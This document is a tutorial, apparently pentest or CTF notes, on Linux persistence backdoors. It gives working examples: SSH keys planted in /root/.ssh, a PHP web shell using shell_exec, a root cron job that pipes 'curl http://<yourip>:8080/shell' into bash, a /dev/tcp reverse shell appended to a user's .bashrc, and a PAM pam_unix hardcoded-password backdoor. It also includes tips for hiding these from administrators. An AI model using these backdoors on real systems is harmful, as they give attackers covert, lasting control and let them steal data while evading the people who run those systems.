# Backdoor 

## backdoor using ssh
The ssh backdoor essentially consists of leaving our ssh keys in some user’s home directory. Usually the user would be root as it’s the user with the highest privileges.
- ssh backdoor 
	```
	ssh-keygen
	```
	- Now that we have 2 keys. 1 private key and 1 public key, we can now go to /root/.ssh and leave our public key there. Don't forget to rename the public key to : authorized\_keys
	- give the private key the right permissions using : chmod 600 id\_rsa

## PHP backdoor
you can try creating a php file with any name and putting inside this piece of code

- php backdoor code
	```php
	<?php  
    if (isset($\_REQUEST\['cmd'\])) {  
        echo "<pre>" . shell\_exec($\_REQUEST\['cmd'\]) . "</pre>";  
    }  
	?>
	```
	
**tips**
1\. Try to add this piece of code in already existing php files in /var/www/html. Adding it more towards the middle of files will definitely make our malicious actions a little more secret.

2\. Change the "cmd" parameter to something else... anything actually... just change it to something that isn't that common. "Cmd" is really common and is already really well known in the hacking community.

## cronjob backdoor
this backdoor consist of creating a cronjob!
take a look at your cronjobs file, which is /etc/cronjob
Once you got root access on any host, you can add any scheduled task. You could even just configure a task where every minute a reverse shell is sent to you. Which is exactly what we're going to do.
- crontab script
	```
	* *     * * *   root    curl http://<yourip>:8080/shell | bash
	```
	Notice that we put a "\*" star symbol to everything. This means that our task will run every minute, every hour, every day , etc .

	We first use "curl" to download a file , and then we pipe it to "bash"

	The contents of the "shell" file that we are using are simply :
	```bash
	#!/bin/bash 
	bash -i >& /dev/tcp/ip/port 0>&1
	```
	We would have to run an HTTP server serving our shell.

	You can achieve this by running : "python3 -m http.server 8080"  
	Once our shell gets downloaded, it will be executed by "bash" and we would get a shell!
	Don't forget to listen on your specified port with "nc -nvlp <port>"
	
## .bashrc backdoor
If a user has bash as their login shell, the ".bashrc" file in their home directory is executed when an interactive session is launched.
So If you know any users that log on to their system quite often, you could simply run this command to include your reverse shell into their ".bashrc".
```bash
echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc
```
One important thing is to always have your nc listener ready as you don't know when your user will log on.

This attack is very sneaky as nobody really thinks about ever checking their ".bashrc" file.

On the other hand, you can't exactly know if any of the user's will actually login to their system, so you might really wait a long period of time.

## pam unix 
	We can see that we added a new line to our code : "if (strcmp(p, "0xMitsurugi") != 0 )"

Okay, if this code looks confusing to you at first, don't worry!

We'll break it down together!

So first, we have to know what the function "strcmp" does.

This function basically compares 2 strings.

In the screenshot above, we compare the variable "p" and the string "0xMitsurugi".

The variable "p" stands for the user's supplied password. In other words, the password that the user-supplied.

You can also see "!=0" at the end of the statement. This means "if not successful". So, if the variable "p"(user-supplied password) and the string "0xMitsurugi" are NOT the same... the function "unix\_verify\_password" will be used.

But on the other hand, if the variable "p"(user-supplied password) and the string "0xMitsurugi" are the same, the authentication is a success. We mark the success by using "PAM\_SUCCESS;"

So this backdoor essentially consists of adding your own password to "pam\_unix.so"

Since you know the password that you added into the file, you will always be able to authenticate with that password until it's removed from "pam\_unix.so"

So let's do a little recap:

Say a user types the password "password123" and tries to authenticate. We will compare his password(password123) to the string "0xMitsurugi".

If those two strings match, the authentication is successful. But those 2 strings do not match, so the authentication will not be

successful and will rely on the "unix\_verify\_password" function. When using the "unix\_verify\_password" function to authenticate, the function takes

the user's password from "/etc/shadow" and compares it to the user's supplied password. This is how the intended authentication system should work.

However, this technique is called a backdoor as you add your own password that you can always use as long as nobody takes it out of "pam\_unix.so".

This backdoor is really hard to spot, as once again, nobody really thinks about looking into such files.

Since this method is slowly becoming more and more popular, you probably won't be able to do it every time, as everybody would slowly but surely, understand how to protect themselves.

Resource used : [http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html](http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html)

Here is a GitHub repository containing a script automating this process of creating a backdoor: [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)
	

	
	